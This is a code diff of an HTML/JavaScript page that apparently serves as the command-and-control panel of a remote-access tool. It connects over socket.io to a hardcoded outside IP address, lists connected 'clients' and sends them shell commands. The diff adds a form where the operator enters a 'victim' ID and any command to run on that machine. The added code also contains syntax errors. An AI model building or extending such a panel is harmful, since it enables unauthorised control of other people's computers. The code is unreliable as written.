@@ -11,6 +11,12 @@
 
 
   <script>
+
+  
+
+    var socket = io('http://13.126.74.47:8000');
+
+
   function generateUsersList(data) {
       data = JSON.parse(data);
     var str = '<table class="table">';
@@ -22,35 +28,39 @@
     return str;
   }
       
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
-      
 
-    var socket = io('http://13.126.74.47:8000');
+  $(document).ready(function() {
+
+      $("#runcmd").on('click', function() { 
+
+          socket.emit('send_client_cmd', { toclient: $("#victim").val();, cmd: $("#cmdinput").val(); }, function (data) {
+                alert(data) 
+          });
+
+          
+      });
+
+      
+   });    
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
 
     socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
         console.log("Connect ACK");
         socket.emit('list_clients', null, function (data) {
             console.log("Listing clients...");
             $("#clients").append(generateUsersList(data));
-
-
-            
-            
-            
-
-
-
 
             socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
                 console.log(data) 
@@ -81,11 +91,22 @@
   
 <div class="container">
   <div class="row">
+    <h2>Connected clients</h2>
     <div class="col-sm-12" id="clients">
 
     </div>
 
   </div>
+
+  <div class="row">
+    <h2>Operations</h2>
+    <div class="col-sm-12" id="operations">
+        <input id="victim" placeholder="Client ID"></input><input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Run</button> 
+    </div>
+
+  </div>
+
+
 </div>
 
 </body>
